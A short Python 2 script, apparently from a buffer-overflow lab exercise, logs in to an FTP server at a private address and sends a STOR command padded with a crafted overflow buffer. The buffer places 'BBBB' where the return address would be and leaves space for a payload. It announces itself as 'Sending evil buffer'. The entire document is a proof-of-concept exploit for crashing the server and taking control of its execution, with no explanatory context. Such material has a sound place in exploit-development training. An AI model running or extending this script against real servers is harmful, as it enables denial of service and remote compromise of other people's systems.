#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = '\x41' * 965 + '\x42\x42\x42\x42' + '\x43' * 16 + '\x44' * 1015

print "\nSending evil buffer..."

s.connect(('192.168.13.134',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
s.close()